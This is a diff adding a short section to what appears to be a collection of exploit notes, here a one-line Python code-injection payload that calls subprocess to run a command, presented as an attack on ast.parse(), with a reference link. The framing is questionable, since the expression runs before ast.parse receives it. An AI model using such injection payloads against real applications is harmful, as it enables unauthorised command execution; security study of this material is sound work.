@@ -1025,6 +1025,21 @@ The poc below bypasses the fix for `CVE-2022-29078` in `^3.1.7`
 
 ------------------
 
+### Exploiting ast.parse() in python with keyword `mode` set to `eval` or not
+
+- Payload-:```ast.parse(len(__import__('subprocess').Popen('ls').communicate()))```
+
+![image](https://github.com/user-attachments/assets/9144d74b-f144-43a7-8a85-8c30a82fbeb2)
+
+------------------
+
+### REFERENCES-:
+
+- [Twosix](https://twosixtech.com/blog/hijacking-the-ast-to-safely-handle-untrusted-python/)
+
+------------------
+
+
 
 
 
